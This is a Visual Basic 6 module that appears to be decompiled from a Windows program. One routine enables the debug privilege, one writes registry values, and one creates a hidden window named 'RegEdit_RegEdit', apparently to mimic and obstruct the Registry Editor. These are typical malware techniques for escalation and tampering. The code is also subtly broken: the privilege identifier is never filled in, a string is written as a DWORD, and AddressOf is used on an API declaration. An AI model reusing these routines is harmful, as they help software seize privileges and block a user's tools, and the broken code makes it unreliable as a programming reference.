Option Explicit

Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function OpenProcessToken Lib "advapi32" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
Private Declare Function LookupPrivilegeValue Lib "advapi32" Alias "LookupPrivilegeValueA" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As Any) As Long
Private Declare Function AdjustTokenPrivileges Lib "advapi32" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, NewState As Any, ByVal BufferLength As Long, PreviousState As Any, ReturnLength As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
Private Declare Function RegisterClass Lib "user32" Alias "RegisterClassA" (Class As WNDCLASS) As Long
Private Declare Function CreateWindowEx Lib "user32" Alias "CreateWindowExA" (ByVal dwExStyle As Long, ByVal lpClassName As String, ByVal lpWindowName As String, ByVal dwStyle As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As Long, ByVal hMenu As Long, ByVal hInstance As Long, lpParam As Any) As Long
Private Declare Function DefWindowProc Lib "user32" Alias "DefWindowProcA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

Private Type TOKEN_PRIVILEGES
    PrivilegeCount As Long
    LuidLow As Long
    LuidHigh As Long
    Attributes As Long
End Type

Private Type WNDCLASS
    style As Long
    lpfnWndProc As Long
    cbClsExtra As Long
    cbWndExtra As Long
    hInstance As Long
    hIcon As Long
    hCursor As Long
    hbrBackground As Long
    lpszMenuName As String
    lpszClassName As String
End Type

Private Const TOKEN_ADJUST_PRIVILEGES = &H20
Private Const TOKEN_QUERY = &H8
Private Const SE_PRIVILEGE_ENABLED = &H2
Private Const KEY_SET_VALUE = &H20006
Private Const REG_SZ = 1
Private Const REG_DWORD = 4
Private Const CS_HREDRAW = &H1
Private Const CS_VREDRAW = &H2
Private Const WS_EX_APPWINDOW = &H40000
Private Const WS_OVERLAPPEDWINDOW = &HCF0000

Public Function Proc_2_0_45BA20() As Boolean
    Dim hToken As Long
    Dim tLuid As Long
    Dim tTP As TOKEN_PRIVILEGES
    
    If OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES Or TOKEN_QUERY, hToken) Then
        If LookupPrivilegeValue(vbNullString, "SeDebugPrivilege", tLuid) Then
            tTP.PrivilegeCount = 1
            tTP.Attributes = SE_PRIVILEGE_ENABLED
            AdjustTokenPrivileges hToken, False, tTP, Len(tTP), ByVal 0&, ByVal 0&
            Proc_2_0_45BA20 = True
        End If
    End If
End Function

Public Sub Proc_2_1_45BB50(ByVal hKey As Long, ByVal sSubKey As String, ByVal sValueName As String, ByVal sData As String)
    Dim hOpenedKey As Long
    
    If RegOpenKeyEx(hKey, sSubKey, 0, KEY_SET_VALUE, hOpenedKey) = 0 Then
        RegSetValueEx hOpenedKey, sValueName, 0, REG_DWORD, ByVal sData, 4
        RegCloseKey hOpenedKey
    End If
End Sub

Public Sub Proc_2_2_45BCD0()
    Dim wc As WNDCLASS
    Dim hWnd As Long
    
    wc.style = CS_HREDRAW Or CS_VREDRAW
    wc.lpfnWndProc = AddressOf DefWindowProc
    wc.hInstance = App.hInstance
    wc.lpszClassName = "RegEdit_RegEdit"
    
    If RegisterClass(wc) Then
        hWnd = CreateWindowEx(WS_EX_APPWINDOW, "RegEdit_RegEdit", vbNullString, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, 0, 0, App.hInstance, ByVal 0&)
    End If
End Sub
